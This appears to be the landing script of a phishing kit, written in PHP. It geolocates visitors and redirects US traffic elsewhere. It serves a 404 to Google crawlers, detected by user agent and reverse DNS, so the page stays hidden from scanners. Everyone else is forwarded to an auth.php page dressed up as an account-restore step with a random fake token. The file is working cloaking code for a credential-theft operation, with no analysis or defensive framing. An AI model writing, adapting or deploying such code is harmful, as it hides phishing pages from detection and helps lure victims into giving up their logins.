<?php

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
// create a variable for the country code
$var_country_code = $geoplugin->countryCode;
// redirect based on country code:
if ($var_country_code == "US") {
header('Location: http://404.com/');
}

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

$x=md5(microtime());
echo "<META HTTP-EQUIV='refresh' content='0; URL=auth.php?Go=_Restore_Start&_Acess_Tooken=$x$x'>";exit;
?>
                            